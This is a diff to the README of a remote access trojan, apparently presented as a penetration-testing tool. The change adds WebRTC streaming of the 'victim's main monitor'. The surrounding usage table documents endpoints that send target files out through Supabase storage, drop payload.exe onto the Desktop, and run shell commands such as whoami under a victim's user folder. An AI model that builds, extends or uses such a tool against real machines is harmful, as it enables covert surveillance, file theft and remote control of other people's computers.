@@ -7,10 +7,9 @@ RAT for penetration testing. Client-server remote administration with Supabase-b
 Browser Client  
 ├── HTTP: FastAPI Server (port 6969, Windows target)  
 ├── pyautogui (screenshots)  
-├── subprocess (cmd execution)    
+├── subprocess (cmd execution) 
+├── WebRTC (screen monitoring)    
 └── Supabase (file storage)
-
-
 
 
 The server runs on the target Windows machine. The client is a static HTML page. File exfiltration/injection routes through Supabase storage.
@@ -28,6 +27,7 @@ The server runs on the target Windows machine. The client is a static HTML page.
 | `GET /downloadfile` | Upload target file → Supabase, return public URL |
 | `GET /uploadfile` | Download from Supabase → write to target |
 | `GET /cmd` | Execute shell command |
+| `POST /offer` | Streams the victim's main monitor (WebRTC) |
 
 ## Quick Start
 
@@ -76,6 +76,7 @@ All endpoints accept GET requests. Paths are relative to C:\.
 | /downloadfile?path=secret.docx |  	returns Supabase URL
 | /uploadfile?dwpath=Desktop\&dbfilename=payload.exe	| 
 | /cmd?cmd=whoami&path=Users\victim	| returns {stdout, stderr, code}
+| /offer     |
 -----
 
 # Security Notes
